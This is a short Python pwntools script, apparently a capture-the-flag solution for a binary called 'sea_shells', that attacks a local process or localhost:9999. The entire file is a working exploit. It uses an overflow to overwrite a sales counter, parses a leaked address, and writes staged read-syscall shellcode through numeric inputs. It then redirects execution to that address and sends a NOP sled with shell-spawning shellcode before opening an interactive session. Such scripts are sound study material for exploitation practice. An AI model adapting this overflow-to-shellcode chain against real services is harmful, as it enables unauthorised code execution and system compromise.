#!/usr/bin/env python3

from pwn import *

exe = ELF("./sea_shells")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("localhost", 9999)

    return r


def main():
    r = conn()

    # good luck pwning :)
    r.recvuntil(b"guess!\n")

    # use the overflow to overwrite num_sold
    r.send(b'0\n'*4)
    r.sendline(b'y' + b'\x00'*4)
    r.send(b'0\n'*4)

    r.recvuntil(b'work: ')
    leak = int(r.recvline(), 16)

    r.sendline('y')
   
    sc = asm(f'''
    xor eax, eax
    mov rsi, {hex(leak+18)}
    xor edi, edi
    mov edx, esi
    syscall
    ''')
    #print('DEBUG', len(sc))
    #print('DEBUG', disasm(sc))
    #exit()

    r.sendline(str(u64(sc[8:10]+b'\x00'*6)-0x050F))
    r.sendline(str(u64(sc[8:16])))
    r.sendline(str(0x0000000000000000))
    r.sendline(str(u64(sc[:8])))
    r.sendline(b'n' + b'E'*16 + p64(leak))
   
    sleep(1)
    r.sendline(b'\x90'*32 + asm('sub rsp, 0x30') + asm(shellcraft.sh()))

    r.interactive()


if __name__ == "__main__":
    main()
